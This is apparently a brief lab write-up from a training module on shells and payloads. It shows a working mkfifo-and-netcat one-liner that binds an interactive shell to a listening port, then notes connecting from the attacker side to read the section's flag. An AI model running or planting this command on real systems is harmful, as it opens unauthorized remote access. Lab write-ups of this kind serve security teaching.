# Module 115 — Shells & Payloads
## Bind Shells

## Approach
Created a bind shell using `mkfifo` + netcat:
```bash
mkfifo /tmp/f
/bin/sh -i < /tmp/f 2>&1 | nc -lvp <port> > /tmp/f
```
Connected to it from the attacker side, then read the section's answer/flag off the resulting shell session.
